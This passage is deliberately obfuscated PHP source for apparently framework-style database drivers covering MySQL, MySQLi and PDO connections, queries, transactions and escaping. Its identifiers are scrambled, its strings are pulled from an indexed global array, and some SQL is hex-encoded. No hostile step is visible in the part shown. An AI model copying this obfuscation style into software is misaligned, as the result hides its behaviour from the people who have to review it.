array()) { $úú™µÏÕ =& $_SERVER[ïÃ°£«Ê]; foreach ($¶ÖÈëÕš as $¡ç²Ë€ => $ğ¥ĞÇ·ü) { $Ç®ÛÏºè = $this->parseValue($ğ¥ĞÇ·ü); if (is_scalar($Ç®ÛÏºè)) { $÷Ê£®Å­[] = $Ç®ÛÏºè; $Œ¸¨²‰Í[] = $this->parseKey($¡ç²Ë€); } } $…ÃÊş‚Ü = $úú™µÏÕ[1064] . $this->parseTable($Úıî®ØŸ[$úú™µÏÕ[357]]) . $úú™µÏÕ[1065] . implode($úú™µÏÕ[50], $Œ¸¨²‰Í) . $úú™µÏÕ[1066] . implode($úú™µÏÕ[50], $÷Ê£®Å­) . $úú™µÏÕ[1067]; return $this->execute($…ÃÊş‚Ü); } public function insertAll($ÛÉÓ™Æ, $äµñß›î = array(), $Ø‰è¦şÀ = false) { $Åéµı“ =& $_SERVER[ïÃ°£«Ê]; if (!is_array($ÛÉÓ™Æ[0])) { return !1; } $ñôØ¶§À = array_keys($ÛÉÓ™Æ[0]); $º´½¬ = array(); foreach ($ÛÉÓ™Æ as $€Æ¤÷á) { $²ÎÁïãß = array(); foreach ($€Æ¤÷á as $”¥¸óò˜ => $¸°ı¬Áâ) { $¸°ı¬Áâ = $this->parseValue($¸°ı¬Áâ); if (is_scalar($¸°ı¬Áâ)) { $²ÎÁïãß[] = $¸°ı¬Áâ; } } $º´½¬[] = $Åéµı“[337] . implode($Åéµı“[50], $²ÎÁïãß) . $Åéµı“[1067]; } array_walk($ñôØ¶§À, array($this, $Åéµı“[1068])); $Ş‘õ€™ü = $Ø‰è¦şÀ ? $Åéµı“[1069] : $Åéµı“[1070]; $Ş‘õ€™ü = $Åéµı“[1070]; $«—É¶§³ = $Ş‘õ€™ü . $Åéµı“[1071] . $this->parseTable($äµñß›î[$Åéµı“[357]]) . $Åéµı“[1065] . implode($Åéµı“[50], $ñôØ¶§À) . $Åéµı“[1072] . implode($Åéµı“[50], $º´½¬); if ($Ø‰è¦şÀ) { $œ‰€—şğ = array(); foreach ($ñôØ¶§À as $”¥¸óò˜) { if ($”¥¸óò˜ == $Åéµı“[231] || $”¥¸óò˜ == $Åéµı“[1073]) { continue; } $œ‰€—şğ[] = $”¥¸óò˜ . $Åéµı“[1074] . $”¥¸óò˜ . $Åéµı“[1067]; } $«—É¶§³ .= $Åéµı“[1075] . implode($Åéµı“[50], $œ‰€—şğ); } return $this->execute($«—É¶§³); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ô¦İ·´Ÿ =& $_SERVER[ïÃ°£«Ê]; $this->error = mysql_errno() . $Ô¦İ·´Ÿ[4] . mysql_error($this->_linkID); if ($Ô¦İ·´Ÿ[12] != $this->queryStr) { $this->error .= LNG($Ô¦İ·´Ÿ[48]) . $this->queryStr; } think_trace($this->error, $Ô¦İ·´Ÿ[12], $Ô¦İ·´Ÿ[49]); return $this->error; } public function escapeString($½èı™û—) { if ($this->_linkID) { return mysql_real_escape_string($½èı™û—, $this->_linkID); } else { return mysql_escape_string($½èı™û—); } } public function parseKey(&$¯æ¶á®†, $è©›ú‘ = true) { $…Ìá»‘Î =& $_SERVER[ïÃ°£«Ê]; if ($è©›ú‘) { $¯æ¶á®† = $this->parseKeyCheck($¯æ¶á®†); } if ($¯æ¶á®† != $…Ìá»‘Î[220] && !preg_match($…Ìá»‘Î[1076], $¯æ¶á®†)) { $¯æ¶á®† = $…Ìá»‘Î[475] . trim($¯æ¶á®†, $…Ìá»‘Î[475]) . $…Ìá»‘Î[475]; } return $¯æ¶á®†; } } class DbMysqli extends Db { public function __construct($Ô¬ÂÜÛ = '') { $ö“¼ÒÜ =& $_SERVER[ïÃ°£«Ê]; if (!extension_loaded($ö“¼ÒÜ[1077])) { think_exception(think_lang($ö“¼ÒÜ[14]) . $ö“¼ÒÜ[1078]); } if (!empty($Ô¬ÂÜÛ)) { $this->config = $Ô¬ÂÜÛ; if (empty($this->config[$ö“¼ÒÜ[17]])) { $this->config[$ö“¼ÒÜ[17]] = $ö“¼ÒÜ[12]; } } } public function connect($êä´Ş¢÷ = '', $õ¼ÌèÓ = 0) { $øã™úÀ¨ =& $_SERVER[ïÃ°£«Ê]; if (!isset($this->linkID[$õ¼ÌèÓ])) { if (empty($êä´Ş¢÷)) { $êä´Ş¢÷ = $this->config; } $this->linkID[$õ¼ÌèÓ] = new mysqli($êä´Ş¢÷[$øã™úÀ¨[1048]], $êä´Ş¢÷[$øã™úÀ¨[1050]], $êä´Ş¢÷[$øã™úÀ¨[1051]], $êä´Ş¢÷[$øã™úÀ¨[21]], $êä´Ş¢÷[$øã™úÀ¨[1049]] ? intval($êä´Ş¢÷[$øã™úÀ¨[1049]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $û¬åìš’ = $this->linkID[$õ¼ÌèÓ]->server_version; $this->linkID[$õ¼ÌèÓ]->query($øã™úÀ¨[1052] . think_config($øã™úÀ¨[1053]) . $øã™úÀ¨[58]); if ($û¬åìš’ > $øã™úÀ¨[1054]) { $this->linkID[$õ¼ÌèÓ]->query($øã™úÀ¨[1055]); } $this->connected = !0; if (1 != think_config($øã™úÀ¨[22])) { unset($this->config); } } return $this->linkID[$õ¼ÌèÓ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($èƒúáÙŒ) { $ˆÜŸ¦Ñ¥ =& $_SERVER[ïÃ°£«Ê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $èƒúáÙŒ; if ($this->queryID) { $this->free(); } think_action_status($ˆÜŸ¦Ñ¥[23], 1); think_status($ˆÜŸ¦Ñ¥[24]); $this->queryID = $this->_linkID->query($èƒúáÙŒ); if ($this->_linkID->more_results()) { while (($ õŠÆ–ã = $this->_linkID->next_result()) != NULL) { $ õŠÆ–ã->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Şá„Ûåµ) { $ğŒã¯ ¦ =& $_SERVER[ïÃ°£«Ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Şá„Ûåµ; if ($this->queryID) { $this->free(); } think_action_status($ğŒã¯ ¦[25], 1); think_status($ğŒã¯ ¦[24]); $Ã·Ğä€æ = $this->_linkID->query($Şá„Ûåµ); $this->debug(); if (!1 === $Ã·Ğä€æ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ıâ…¤€ñ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ıâ…¤€ñ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ü¥Îö§× = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ü¥Îö§×) { $this->error(); return !1; } } return !0; } private function getAll() { $ü¾à¤ïÈ = array(); if ($this->numRows > 0) { for ($¾®Ø©Æø = 0; $¾®Ø©Æø < $this->numRows; $¾®Ø©Æø++) { $ü¾à¤ïÈ[$¾®Ø©Æø] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ü¾à¤ïÈ; } public function getFields($Ì¤¥Î¸ó) { $Ï¨Öêª =& $_SERVER[ïÃ°£«Ê]; $˜óÏ÷×Ò = $this->query($Ï¨Öêª[1059] . $this->parseKey($Ì¤¥Î¸ó)); $½Ü¯óâ¿ = array(); if ($˜óÏ÷×Ò) { foreach ($˜óÏ÷×Ò as $ö©“‚ü  => $êÑÆùëÁ) { $½Ü¯óâ¿[$êÑÆùëÁ[$Ï¨Öêª[31]]] = array($Ï¨Öêª[32] => $êÑÆùëÁ[$Ï¨Öêª[31]], $Ï¨Öêª[33] => $êÑÆùëÁ[$Ï¨Öêª[34]], $Ï¨Öêª[35] => (bool) ($êÑÆùëÁ[$Ï¨Öêª[36]] === $Ï¨Öêª[12]), $Ï¨Öêª[37] => $êÑÆùëÁ[$Ï¨Öêª[38]], $Ï¨Öêª[39] => strtolower($êÑÆùëÁ[$Ï¨Öêª[40]]) == $Ï¨Öêª[41], $Ï¨Öêª[42] => strtolower($êÑÆùëÁ[$Ï¨Öêª[43]]) == $Ï¨Öêª[44]); } } return $½Ü¯óâ¿; } public function getTables($ãÌ¢İ÷ = '') { $ãîıõâÒ =& $_SERVER[ïÃ°£«Ê]; $Ñ†ªè¨’ = !empty($ãÌ¢İ÷) ? $ãîıõâÒ[1061] . $ãÌ¢İ÷ . $ãîıõâÒ[1062] : $ãîıõâÒ[1063]; $¡œÉãä¯ = $this->query($Ñ†ªè¨’); $ª¶Øı¸¿ = array(); if ($¡œÉãä¯) { foreach ($¡œÉãä¯ as $À¶¤·êÆ => $Ö·Ÿğİœ) { $ª¶Øı¸¿[$À¶¤·êÆ] = current($Ö·Ÿğİœ); } } return $ª¶Øı¸¿; } public function replace($Øİà¥®, $ìé›ÕÀ’ = array()) { $‹š½¨Ì¿ =& $_SERVER[ïÃ°£«Ê]; foreach ($Øİà¥® as $öÉ”„Æª => $êµó„ïğ) { $ñàÎ×³ = $this->parseValue($êµó„ïğ); if (is_scalar($ñàÎ×³)) { $•ô§šûû[] = $ñàÎ×³; $İÊˆø½¿[] = $this->parseKey($öÉ”„Æª); } } $âû «ÄÁ = $‹š½¨Ì¿[1064] . $this->parseTable($ìé›ÕÀ’[$‹š½¨Ì¿[357]]) . $‹š½¨Ì¿[1065] . implode($‹š½¨Ì¿[50], $İÊˆø½¿) . $‹š½¨Ì¿[1066] . implode($‹š½¨Ì¿[50], $•ô§šûû) . $‹š½¨Ì¿[1067]; return $this->execute($âû «ÄÁ); } public function insertAll($ãòš‡¢‰, $¥ÊÅÙŠ¯ = array(), $èÚ´œä = false) { $·“ÖİêÔ =& $_SERVER[ïÃ°£«Ê]; if (!is_array($ãòš‡¢‰[0])) { return !1; } $ÅÒŸ©åÌ = array_keys($ãòš‡¢‰[0]); $±Éçá¶ = array(); foreach ($ãòš‡¢‰ as $ÉçóÑ£®) { $‹š‹¾•ş = array(); foreach ($ÉçóÑ£® as $ßÀİÅÂ => $È•ÁÑ³) { $È•ÁÑ³ = $this->parseValue($È•ÁÑ³); if (is_scalar($È•ÁÑ³)) { $‹š‹¾•ş[] = $È•ÁÑ³; } } $±Éçá¶[] = $·“ÖİêÔ[337] . implode($·“ÖİêÔ[50], $‹š‹¾•ş) . $·“ÖİêÔ[1067]; } array_walk($ÅÒŸ©åÌ, array($this, $·“ÖİêÔ[1068])); $Îëêş ‘ = $èÚ´œä ? $·“ÖİêÔ[1069] : $·“ÖİêÔ[1070]; $Îëêş ‘ = $·“ÖİêÔ[1070]; $´¶ÖÚ¬ = $Îëêş ‘ . $·“ÖİêÔ[1071] . $this->parseTable($¥ÊÅÙŠ¯[$·“ÖİêÔ[357]]) . $·“ÖİêÔ[1065] . implode($·“ÖİêÔ[50], $ÅÒŸ©åÌ) . $·“ÖİêÔ[1072] . implode($·“ÖİêÔ[50], $±Éçá¶); if ($èÚ´œä) { $— ÅŒÊ– = array(); foreach ($ÅÒŸ©åÌ as $ßÀİÅÂ) { if ($ßÀİÅÂ == $·“ÖİêÔ[231] || $ßÀİÅÂ == $·“ÖİêÔ[1073]) { continue; } $— ÅŒÊ–[] = $ßÀİÅÂ . $·“ÖİêÔ[1074] . $ßÀİÅÂ . $·“ÖİêÔ[1067]; } $´¶ÖÚ¬ .= $·“ÖİêÔ[1075] . implode($·“ÖİêÔ[50], $— ÅŒÊ–); } return $this->execute($´¶ÖÚ¬); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $šÂµ‰ªÈ =& $_SERVER[ïÃ°£«Ê]; $this->error = $this->_linkID->errno . $šÂµ‰ªÈ[4] . $this->_linkID->error; if ($šÂµ‰ªÈ[12] != $this->queryStr) { $this->error .= LNG($šÂµ‰ªÈ[48]) . $this->queryStr; } think_trace($this->error, $šÂµ‰ªÈ[12], $šÂµ‰ªÈ[49]); return $this->error; } public function escapeString($¸´şŸËø) { if ($this->_linkID) { return $this->_linkID->real_escape_string($¸´şŸËø); } else { return addslashes($¸´şŸËø); } } public function parseKey(&$—ÙïÚ¬½, $²ˆ£Ñè = true) { $ø¶†ªá =& $_SERVER[ïÃ°£«Ê]; if ($²ˆ£Ñè) { $—ÙïÚ¬½ = $this->parseKeyCheck($—ÙïÚ¬½); } if ($—ÙïÚ¬½ != $ø¶†ªá[220] && !preg_match($ø¶†ªá[1076], $—ÙïÚ¬½)) { $—ÙïÚ¬½ = $ø¶†ªá[475] . trim($—ÙïÚ¬½, $ø¶†ªá[475]) . $ø¶†ªá[475]; } return $—ÙïÚ¬½; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Êä™Ğ®Æ = '') { $Æ¿â×²µ =& $_SERVER[ïÃ°£«Ê]; if (!class_exists($Æ¿â×²µ[1079])) { think_exception(think_lang($Æ¿â×²µ[14]) . $Æ¿â×²µ[1080]); } if (!empty($Êä™Ğ®Æ)) { $this->config = $Êä™Ğ®Æ; if (empty($this->config[$Æ¿â×²µ[17]])) { $this->config[$Æ¿â×²µ[17]] = array(); } } } public function connect($€öı¥ıû = '', $ù¶ğ‰‹Ÿ = 0) { $÷›¶Ö€Â =& $_SERVER[ïÃ°£«Ê]; if (!isset($this->linkID[$ù¶ğ‰‹Ÿ])) { if (empty($€öı¥ıû)) { $€öı¥ıû = $this->config; } $­ş¡şš¼ = !empty($€öı¥ıû[$÷›¶Ö€Â[17]][$÷›¶Ö€Â[18]]) ? $€öı¥ıû[$÷›¶Ö€Â[17]][$÷›¶Ö€Â[18]] : $this->pconnect; if ($­ş¡şš¼) { $€öı¥ıû[$÷›¶Ö€Â[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ù¶ğ‰‹Ÿ] = new PDO($€öı¥ıû[$÷›¶Ö€Â[1081]], $€öı¥ıû[$÷›¶Ö€Â[1050]], $€öı¥ıû[$÷›¶Ö€Â[1051]], $€öı¥ıû[$÷›¶Ö€Â[17]]); } catch (PDOException $—Ñıõõ›) { think_exception($—Ñıõõ›->getMessage()); } $this->dbType = $this->_getDsnType($€öı¥ıû[$÷›¶Ö€Â[1081]]); if (in_array($this->dbType, array($÷›¶Ö€Â[1082], $÷›¶Ö€Â[1083], $÷›¶Ö€Â[1084], $÷›¶Ö€Â[1085]))) { think_exception($÷›¶Ö€Â[1086] . $this->dbType . $÷›¶Ö€Â[1087] . $this->dbType . $÷›¶Ö€Â[1088]); } if (!$this->linkID[$ù¶ğ‰‹Ÿ]) { think_exception($÷›¶Ö€Â[1089]); } try { $this->linkID[$ù¶ğ‰‹Ÿ]->exec($÷›¶Ö€Â[1090] . think_config($÷›¶Ö€Â[1053])); } catch (Exception $—Ñıõõ›) { } $this->connected = !0; if (1 != think_config($÷›¶Ö€Â[22])) { unset($this->config); } } return $this->linkID[$ù¶ğ‰‹Ÿ]; } public function free() { $this->PDOStatement = null; } public function query($†ÛÍ¾øª, $ƒö¦”ÜË = array()) { $Ÿ¤ñû³µ =& $_SERVER[ïÃ°£«Ê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $†ÛÍ¾øª; if (!empty($ƒö¦”ÜË)) { $this->queryStr .= $Ÿ¤ñû³µ[1091] . print_r($ƒö¦”ÜË, !0) . $Ÿ¤ñû³µ[1092]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ÿ¤ñû³µ[23], 1); think_status($Ÿ¤ñû³µ[24]); $this->PDOStatement = $this->_linkID->prepare($†ÛÍ¾øª); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¼¢«´şÉ = $this->PDOStatement->execute($ƒö¦”ÜË); $this->debug(); if (!1 === $¼¢«´şÉ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Ò¿ç··, $€‚Ñ—ÕÜ = array()) { $ö£ó‘· =& $_SERVER[ïÃ°£«Ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ò¿ç··; if (!empty($€‚Ñ—ÕÜ)) { $this->queryStr .= $ö£ó‘·[1091] . print_r($€‚Ñ—ÕÜ, !0) . $ö£ó‘·[1092]; } $ÎÒÄë = !1; if ($this->dbType == $ö£ó‘·[1085]) { if (preg_match($ö£ó‘·[1093], $this->queryStr, $¯¸äêâ›)) { $this->table = think_config($ö£ó‘·[1094]) . str_ireplace(think_config($ö£ó‘·[1095]), $ö£ó‘·[463], $¯¸äêâ›[2]); $ÎÒÄë = (bool) $this->query($ö£ó‘·[1096] . strtoupper($this->table) . $ö£ó‘·[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ö£ó‘·[25], 1); think_status($ö£ó‘·[24]); $this->PDOStatement = $this->_linkID->prepare($Ò¿ç··); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $‡£éï’Ì = $this->PDOStatement->execute($€‚Ñ—ÕÜ); $this->debug(); if (!1 === $‡£éï’Ì) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ÎÒÄë || preg_match($ö£ó‘·[1097], $Ò¿ç··)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Üô­ƒ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Üô­ƒ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÖÍâÒë = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÖÍâÒë) { $this->error(); return !1; } } return !0; } private function getAll() { $¶äè–ş = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¶äè–ş); return $¶äè–ş; } public function getFields($¹ÀÉ³ëô) { $«×‘‹ê¬ =& $_SERVER[ïÃ°£«Ê]; $this->initConnect(!0); if (think_config($«×‘‹ê¬[1098])) { $÷¢ÀÛÔÉ = str_replace($«×‘‹ê¬[1099], $¹ÀÉ³ëô, think_config($«×‘‹ê¬[1098])); } else { switch ($this->dbType) { case $«×‘‹ê¬[1082]: case $«×‘‹ê¬[1100]: $÷¢ÀÛÔÉ = "\123\105\114\x45\x43\x54\x20\x20\40\x63\157\154\x75\x6d\x6e\137\156\x61\155\x65\40\x61\x73\x20\47\x4e\x61\155\145\x27\54\x20\40\40\x64\141\x74\x61\x5f\x74\171\160\x65\x20\141\x73\x20\47\x54\171\160\x65\x27\x2c\40\40\40\x63\157\154\165\155\156\x5f\x64\x65\146\141\x75\154\164\40\141\163\40\47\x44\x65\x66\141\x75\x6c\164\47\54\x20\40\40\x69\163\137\156\165\x6c\154\x61\x62\x6c\145\40\x61\163\x20\47\x4e\165\154\x6c\47\12\x9\x9\106\122\x4f\115\x9\151\x6e\146\x6f\162\155\141\x74\151\x6f\x6e\x5f\x73\143\150\145\155\141\56\x74\x61\142\154\x65\163\40\101\x53\x20\164\12\x9\x9\112\x4f\111\116\x9\151\x6e\146\157\x72\x6d\x61\x74\x69\x6f\156\x5f\x73\143\x68\145\155\x61\56\x63\x6f\154\x75\x6d\156\163\40\101\123\40\x63\xa\x9\x9\x4f\x4e\x20\40\164\56\164\x61\x62\154\x65\137\x63\141\164\141\154\157\x67\40\75\40\143\x2e\164\x61\142\154\x65\137\x63\x61\164\x61\x6c\157\x67\12\11\11\101\x4e\104\x20\164\56\x74\x61\x62\154\145\x5f\x73\x63\x68\x65\155\x61\x20\x3d\40\x63\x2e\164\x61\x62\154\x65\137\163\143\150\145\155\141\12\x9\x9\x41\x4e\x44\x20\164\x2e\x74\x61\x62\154\145\137\156\x61\155\145\x20\75\x20\143\x2e\164\141\142\154\145\137\x6e\x61\x6d\145\12\x9\11\127\110\105\x52\x45\x20\x20\x20\164\x2e\164\141\142\x6c\x65\x5f\x6e\141\x6d\145\x20\x3d\x20\x27{$¹ÀÉ³ëô}\47"; break; case $«×‘‹ê¬[1101]: $÷¢ÀÛÔÉ = $«×‘‹ê¬[1102] . $¹ÀÉ³ëô . $«×‘‹ê¬[1103]; break; case $«×‘‹ê¬[1083]: case $«×‘‹ê¬[1085]: $÷¢ÀÛÔÉ = $«×‘‹ê¬[1104] . $«×‘‹ê¬[1105] . $«×‘‹ê¬[1106] . strtoupper($¹ÀÉ³ëô) . $«×‘‹ê¬[1107] . strtoupper($¹ÀÉ³ëô) . $«×‘‹ê¬[1108]; break; case $«×‘‹ê¬[1109]: $÷¢ÀÛÔÉ = $«×‘‹ê¬[1110] . $¹ÀÉ³ëô . $«×‘‹ê¬[1111]; break; case $«×‘‹ê¬[1084]: break; case $«×‘‹ê¬[1112]: default: $÷¢ÀÛÔÉ = $«×‘‹ê¬[1113] . ($this->dbType == $«×‘‹ê¬[1112] ? "\x60{$¹ÀÉ³ëô}\x60" : $¹ÀÉ³ëô); } } $Áé™ûë = $this->query($÷¢ÀÛÔÉ); $£»ŠÙ«ç = array(); if ($Áé™ûë) { foreach ($Áé™ûë as $™†ç¡ù => $¡­ñ¿»¿) { $¡­ñ¿»¿ = array_change_key_case($¡­ñ¿»¿); $¡­ñ¿»¿[$«×‘‹ê¬[32]] = isset($¡­ñ¿»¿[$«×‘‹ê¬[32]]) ? $¡­ñ¿»¿[$«×‘‹ê¬[32]] : $«×‘‹ê¬[463]; $¡­ñ¿»¿[$«×‘‹ê¬[33]] = isset($¡­ñ¿»¿[$«×‘‹ê¬[33]]) ? $¡­ñ¿»¿[$«×‘‹ê¬[33]] : $«×‘‹ê¬[463]; $ÛØÊˆÈş = isset($¡­ñ¿»¿[$«×‘‹ê¬[351]]) ? $¡­ñ¿»¿[$«×‘‹ê¬[351]] : $¡­ñ¿»¿[$«×‘‹ê¬[32]]; $£»ŠÙ«ç[$ÛØÊˆÈş] = array($«×‘‹ê¬[32] => $ÛØÊˆÈş, $«×‘‹ê¬[33] => $¡­ñ¿»¿[$«×‘‹ê¬[33]], $«×‘‹ê¬[35] => (bool) (isset($¡­ñ¿»¿[$«×‘‹ê¬[103]]) && $¡­ñ¿»¿[$«×‘‹ê¬[103]] === $«×‘‹ê¬[12] || isset($¡­ñ¿»¿[$«×‘‹ê¬[35]]) && $¡­ñ¿»¿[$«×‘‹ê¬[35]] === $«×‘‹ê¬[12]), $«×‘‹ê¬[37] => isset($¡­ñ¿»¿[$«×‘‹ê¬[37]]) ? $¡­ñ¿»¿[$«×‘‹ê¬[37]] : (isset($¡­ñ¿»¿[$«×‘‹ê¬[56]]) ? $¡­ñ¿»¿[$«×‘‹ê¬[56]] : $«×‘‹ê¬[463]), $«×‘‹ê¬[39] => isset($¡­ñ¿»¿[$«×‘‹ê¬[95]]) ? strtolower($¡­ñ¿»¿[$«×‘‹ê¬[95]]) == $«×‘‹ê¬[41] : (isset($¡­ñ¿»¿[$«×‘‹ê¬[57]]) ? $¡­ñ¿»¿[$«×‘‹ê¬[57]] : !1), $«×‘‹ê¬[42] => isset($¡­ñ¿»¿[$«×‘‹ê¬[1114]]) ? strtolower($¡­ñ¿»¿[$«×‘‹ê¬[1114]]) == $«×‘‹ê¬[44] : (isset($¡­ñ¿»¿[$«×‘‹ê¬[95]]) ? $¡­ñ¿»¿[$«×‘‹ê¬[95]] : !1)); } } return $£»ŠÙ«ç; } public function getTables($½µı­…ø = '') { $ô©Í˜² =& $_SERVER[ïÃ°£«Ê]; if (think_config($ô©Í˜²[1115])) { $·Ô€ùšÔ = str_replace($ô©Í˜²[1116], $½µı­…ø, think_config($ô©Í˜²[1115])); } else { switch ($this->dbType) { case $ô©Í˜²[1083]: case $ô©Í˜²[1085]: $·Ô€ùšÔ = $ô©Í˜²[1117]; break; case $ô©Í˜²[1082]: case $ô©Í˜²[1100]: $·Ô€ùšÔ = $ô©Í˜²[1118]; break; case $ô©Í˜²[1109]: $·Ô€ùšÔ = $ô©Í˜²[1119]; break; case $ô©Í˜²[1084]: think_exception(think_lang($ô©Í˜²[1120]) . $ô©Í˜²[1121]); break; case $ô©Í˜²[1101]: $·Ô€ùšÔ = $ô©Í˜²[45] . $ô©Í˜²[46] . $ô©Í˜²[47]; break; case $ô©Í˜²[1112]: default: if (!empty($½µı­…ø)) { $·Ô€ùšÔ = $ô©Í˜²[1061] . $½µı­…ø . $ô©Í˜²[1062]; } else { $·Ô€ùšÔ = $ô©Í˜²[1063]; } } } $‹‚¢–‹£ = $this->query($·Ô€ùšÔ); $·¬“Ô½ = array(); foreach ($‹‚¢–‹£ as $åÕŞ‡¯¿ => $ŸÑöÌÉ¦) { $·¬“Ô½[$åÕŞ‡¯¿] = current($ŸÑöÌÉ¦); } return $·¬“Ô½; } protected function parseLimit($¶Œ„ÖÄ) { $»ûíåÑ =& $_SERVER[ïÃ°£«Ê]; $±Ùë’›Â = $»ûíåÑ[12]; if (!empty($¶Œ„ÖÄ)) { switch ($this->dbType) { case $»ûíåÑ[1109]: case $»ûíåÑ[1101]: $¶Œ„ÖÄ = explode($»ûíåÑ[50], $¶Œ„ÖÄ); if (count($¶Œ„ÖÄ) > 1) { $±Ùë’›Â .= $»ûíåÑ[51] . $¶Œ„ÖÄ[1] . $»ûíåÑ[52] . $¶Œ„ÖÄ[0] . $»ûíåÑ[53]; } else { $±Ùë’›Â .= $»ûíåÑ[51] . $¶Œ„ÖÄ[0] . $»ûíåÑ[53]; } break; case $»ûíåÑ[1082]: case $»ûíåÑ[1100]: break; case $»ûíåÑ[1084]: break; case $»ûíåÑ[1083]: case $»ûíåÑ[1085]: break; case $»ûíåÑ[1112]: default: $±Ùë’›Â .= $»ûíåÑ[51] . $¶Œ„ÖÄ . $»ûíåÑ[53]; } } return $±Ùë’›Â; } public function parseKey(&$¶ó¸¾Ø, $«ƒ¯ÌŠÒ = true) { $°—ÚÊÙ =& $_SERVER[ïÃ°£«Ê]; if ($«ƒ¯ÌŠÒ) { $¶ó¸¾Ø = $this->parseKeyCheck($¶ó¸¾Ø); } if ($this->dbType == $°—ÚÊÙ[1112]) { if ($¶ó¸¾Ø != $°—ÚÊÙ[220] && !preg_match($°—ÚÊÙ[1076], $¶ó¸¾Ø)) { $¶ó¸¾Ø = $°—ÚÊÙ[475] . trim($¶ó¸¾Ø, $°—ÚÊÙ[475]) . $°—ÚÊÙ[475]; } return $¶ó¸¾Ø; } else { return parent::parseKey($¶ó¸¾Ø, $«ƒ¯ÌŠÒ); } } public function close() { $this->_linkID = null; } public function error() { $†ŞÉÀïş =& $_SERVER[ïÃ°£«Ê]; if ($this->PDOStatement) { $­óÆ¢ˆÆ = $this->PDOStatement->errorInfo(); $this->error = $­óÆ¢ˆÆ[1] . $†ŞÉÀïş[4] . $­óÆ¢ˆÆ[2]; } else { $this->error = $†ŞÉÀïş[12]; } if ($†ŞÉÀïş[12] != $this->queryStr) { $this->error .= LNG($†ŞÉÀïş[48]) . $this->queryStr; } think_trace($this->error, $†ŞÉÀïş[12], $†ŞÉÀïş[49]); return $this->error; } public function escapeString($×ÃÑØ‹¯) { $ÇÉ«“²Ì =& $_SERVER[ïÃ°£«Ê]; switch ($this->dbType) { case $ÇÉ«“²Ì[1109]: case $ÇÉ«“²Ì[1082]: case $ÇÉ«“²Ì[1100]: case $ÇÉ«“²Ì[1112]: return addslashes($×ÃÑØ‹¯); case $ÇÉ«“²Ì[1084]: case $ÇÉ«“²Ì[1101]: case $ÇÉ«“²Ì[1083]: case $ÇÉ«“²Ì[1085]: return str_ireplace($ÇÉ«“²Ì[58], $ÇÉ«“²Ì[59], $×ÃÑØ‹¯); } } protected function parseValue($È´âñ—ª) { $×üÎˆ† =& $_SERVER[ïÃ°£«Ê]; if (is_string($È´âñ—ª)) { $ğŸì´ÎÊ = strpos($È´âñ—ª, $×üÎˆ†[4]) === 0 && in_array($È´âñ—ª, array_keys($this->bind)); $È´âñ—ª = $ğŸì´ÎÊ ? $this->escapeString($È´âñ—ª) : $×üÎˆ†[1122] . $this->escapeString($È´âñ—ª) . $×üÎˆ†[1122]; } elseif (isset($È´âñ—ª[0]) && is_string($È´âñ—ª[0]) && strtolower($È´âñ—ª[0]) == $×üÎˆ†[372]) { $È´âñ—ª = $this->escapeString($È´âñ—ª[1]); } elseif (is_array($È´âñ—ª)) { $È´âñ—ª = array_map(array($this, $×üÎˆ†[1123]), $È´âñ—ª); } elseif (is_bool($È´âñ—ª)) { $È´âñ—ª = $È´âñ—ª ? $×üÎˆ†[91] : $×üÎˆ†[228]; } elseif (is_null($È´âñ—ª)) { $È´âñ—ª = $×üÎˆ†[103]; } return $È´âñ—ª; } public function getLastInsertId() { $àË¥¥Ü÷ =& $_SERVER[ïÃ°£«Ê]; switch ($this->dbType) { case $àË¥¥Ü÷[1109]: case $àË¥¥Ü÷[1101]: case $àË¥¥Ü÷[1082]: case $àË¥¥Ü÷[1100]: case $àË¥¥Ü÷[1084]: case $àË¥¥Ü÷[1112]: return $this->_linkID->lastInsertId(); case $àË¥¥Ü÷[1083]: case $àË¥¥Ü÷[1085]: $í¨¬ıîş = $this->table; $àÅ£‰ÆĞ = $this->query("\123\x45\114\105\x43\124\x20{$í¨¬ıîş}\56\x63\x75\x72\162\166\x61\x6c\x20\143\165\x72\162\x76\141\154\x20\106\122\117\115\40\144\165\x61\154"); return $àÅ£‰ÆĞ ? $àÅ£‰ÆĞ[0][$àË¥¥Ü÷[1124]] : 0; } } } goto C³”±ÆëóÑ; C³”±ÆëóÑ: class DbSqlite extends DbSqliteBase { protected function 